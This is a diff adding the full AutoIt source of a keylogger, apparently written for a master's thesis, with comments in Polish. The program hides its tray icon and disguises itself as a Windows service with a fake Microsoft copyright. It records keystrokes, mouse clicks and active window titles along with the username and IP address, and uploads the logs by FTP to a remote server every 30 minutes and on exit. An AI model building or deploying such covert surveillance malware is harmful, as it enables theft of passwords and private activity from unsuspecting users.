@@ -1,0 +1,254 @@
+#NoTrayIcon
+#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
+#AutoIt3Wrapper_Outfile=..\..\..\XXX\winsrv32.exe
+#AutoIt3Wrapper_Compression=4
+#AutoIt3Wrapper_Res_Description=Windows Service 32 control
+#AutoIt3Wrapper_Res_LegalCopyright=Microsoft@2013.03.01
+#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
+
+;===================
+;====Keylogger======
+;=Bartosz Idkowiak==
+;=Praca magisterska=
+;====2013/2014======
+;===================
+
+;=====
+;Ladowane biblioteki au3
+;=====
+
+#include <FTPEx.au3>
+#include <Misc.au3>
+
+
+;=====
+;Zmienne wejsciowe
+;=====
+
+$count = 1
+$sentFlag = 1
+Local $hDLL = DllOpen("user32.dll")
+
+;===
+;Stworzenie sciezki do katalogu z logami i jej ustawienie
+;===
+
+$logDir = "XXX"
+DirCreate ($logDir)
+
+;===
+;Dane do FTP
+;===
+
+$server = 'XXX'
+$i_Passive = '1'
+$port = '21'
+$username = 'XXX'
+$pass = 'XXX'
+
+
+;======
+;Dodatkowe funkcje
+;======
+
+OnAutoItExitRegister ("_sendToFTP") ;Program przy wylaczeniu wysyla log na serwer
+HotKeySet ("+!d", "_terminate") ;Kombinacja klawiszy ALT+SHIFT+D wylacza program
+ProcessSetPriority("winsrv32.exe", 0)
+
+;======
+;Petla glowna
+;======
+
+While 1
+
+$currentDate = @HOUR & ":" & @MIN & ":" & @SEC & " " & @MDAY & "/" & @MON & "/" & @YEAR
+
+;===
+;Cykliczne wysylanie pliku na FTP co 30 minut
+;===
+
+If $sentFlag == 1 and @MIN <> 00 and @MIN <> 30 Then
+	$sentFlag = 0
+EndIf
+
+
+If @MIN == 00 or @MIN == 30 Then
+		If $sentFlag = 0 Then
+			_sendToFTP()
+			$sentFlag = 1
+		EndIf
+EndIf
+
+;===
+;Mysz
+;===
+
+	If _IsPressed("01", $hDLL) Then
+		_logActionMouse("01","LPM")
+
+	ElseIf _IsPressed("02", $hDLL) Then
+		_logActionMouse("02","PPM")
+
+	ElseIf _IsPressed("04", $hDLL) Then
+		_logActionMouse("04","SPM")
+
+;===
+;0-10
+;===
+
+	ElseIf _IsPressed("30", $hDLL) Then
+		_logAction('30', '0')
+	ElseIf _IsPressed("31", $hDLL) Then
+		_logAction('31', '1')
+	ElseIf _IsPressed("32", $hDLL) Then
+		_logAction('32', '2')
+	ElseIf _IsPressed("33", $hDLL) Then
+		_logAction('33', '3')
+	ElseIf _IsPressed("34", $hDLL) Then
+		_logAction('34', '4')
+	ElseIf _IsPressed("35", $hDLL) Then
+		_logAction('35', '5')
+	ElseIf _IsPressed("36", $hDLL) Then
+		_logAction('36', '6')
+	ElseIf _IsPressed("37", $hDLL) Then
+		_logAction('37', '7')
+	ElseIf _IsPressed("38", $hDLL) Then
+		_logAction('38', '8')
+	ElseIf _IsPressed("39", $hDLL) Then
+		_logAction('39', '9')
+
+;===
+;A-Z
+;===
+
+	ElseIf _IsPressed("41", $hDLL) Then
+		_logAction('41','a')
+	ElseIf _IsPressed("42", $hDLL) Then
+		_logAction('42', 'b')
+	ElseIf _IsPressed("43", $hDLL) Then
+		_logAction('43', 'c')
+	ElseIf _IsPressed("44", $hDLL) Then
+		_logAction('44', 'd')
+	ElseIf _IsPressed("45", $hDLL) Then
+		_logAction('45', 'e')
+	ElseIf _IsPressed("46", $hDLL) Then
+		_logAction('46', 'f')
+	ElseIf _IsPressed("47", $hDLL) Then
+		_logAction('47', 'g')
+	ElseIf _IsPressed("48", $hDLL) Then
+		_logAction('48', 'h')
+	ElseIf _IsPressed("49", $hDLL) Then
+		_logAction('49', 'i')
+	ElseIf _IsPressed("4A", $hDLL) Then
+		_logAction('4A', 'j')
+	ElseIf _IsPressed("4B", $hDLL) Then
+		_logAction('4B', 'k')
+	ElseIf _IsPressed("4C", $hDLL) Then
+		_logAction('4C', 'l')
+	ElseIf _IsPressed("4D", $hDLL) Then
+		_logAction('4D', 'm')
+	ElseIf _IsPressed("4E", $hDLL) Then
+		_logAction('4E', 'n')
+	ElseIf _IsPressed("4F", $hDLL) Then
+		_logAction('4F', 'o')
+	ElseIf _IsPressed("50", $hDLL) Then
+		_logAction('50', 'p')
+	ElseIf _IsPressed("51", $hDLL) Then
+		_logAction('51', 'q')
+	ElseIf _IsPressed("52", $hDLL) Then
+		_logAction('52', 'r')
+	ElseIf _IsPressed("53", $hDLL) Then
+		_logAction('53', 's')
+	ElseIf _IsPressed("54", $hDLL) Then
+		_logAction('54', 't')
+	ElseIf _IsPressed("55", $hDLL) Then
+		_logAction('55', 'u')
+	ElseIf _IsPressed("56", $hDLL) Then
+		_logAction('56', 'v')
+	ElseIf _IsPressed("57", $hDLL) Then
+		_logAction('57', 'w')
+	ElseIf _IsPressed("58", $hDLL) Then
+		_logAction('58', 'x')
+	ElseIf _IsPressed("59", $hDLL) Then
+		_logAction('59', 'y')
+	ElseIf _IsPressed("5A", $hDLL) Then
+		_logAction('5A', 'z')
+
+;===
+;Klawisze funkcyjne
+;===
+
+	ElseIf _IsPressed("08", $hDLL) Then
+		_logAction('08', '[<-]')
+	ElseIf _IsPressed("0D", $hDLL) Then
+		_logAction('0D', '[ent]' & @CRLF)
+	ElseIf _IsPressed("20", $hDLL) Then
+		_logAction('20', ' ')
+	EndIf
+
+WEnd
+
+
+;======
+;Funkcje
+;======
+
+
+;===
+;Odczytywanie klawiszy
+;===
+
+Func _logAction($keyDec, $keyReal)
+		FileWrite($logDir & "\log-" & @MDAY & "-" & @MON & "-" & @YEAR & "_" & @UserName & "_" & @IPAddress1 & ".txt", $keyReal)
+		Do
+			Sleep(1)
+		Until _IsPressed($keyDec, $hDLL) == False
+EndFunc
+
+;===
+;Odczytywanie przyciskow myszy
+;===
+
+Func _logActionMouse($keyDec, $keyReal)
+		$clickInfo = @CRLF & "[" & $currentDate & "][" & $keyReal & "]" & WinGetTitle("[active]")
+		FileWrite($logDir & "\log-" & @MDAY & "-" & @MON & "-" & @YEAR & "_" & @UserName & "_" & @IPAddress1 & ".txt", $clickInfo)
+		Do
+			Sleep(1)
+		Until _IsPressed($keyDec, $hDLL) == False
+EndFunc
+
+;===
+;Wylaczenie programu
+;===
+
+Func _terminate()
+	DllClose($hDLL)
+    Exit
+EndFunc
+
+;===
+;Wysylanie na FTP
+;===
+
+Func _sendToFTP()
+
+$Open = _FTP_Open('FTP')
+$Conn = _FTP_Connect($Open, $server, $username, $pass,$i_Passive,$port)
+
+If $Conn == 0 Then
+	ConsoleWrite("Blad w laczeniu sie do FTP")
+	Return
+EndIf
+	ConsoleWrite("Polaczono do FTP")
+_FTP_FilePut($Conn, $logDir & "\log-" & @MDAY & "-" & @MON & "-" & @YEAR & "_" & @UserName & "_" & @IPAddress1 & ".txt","/domains/nhghzyw.wirt12.biznes-host.pl/logs/log-" & @MDAY & "-" & @MON & "-" & @YEAR & "_" & @UserName & "_" & @IPAddress1 & "_" & $count & ".txt")
+	ConsoleWrite("Wyslano plik")
+	$count = $count + 1
+_FTP_Close($Open)
+
+EndFunc
+
+;=====
+;Zamkniecie biblioteki
+;=====
+
+DllClose($hDLL)
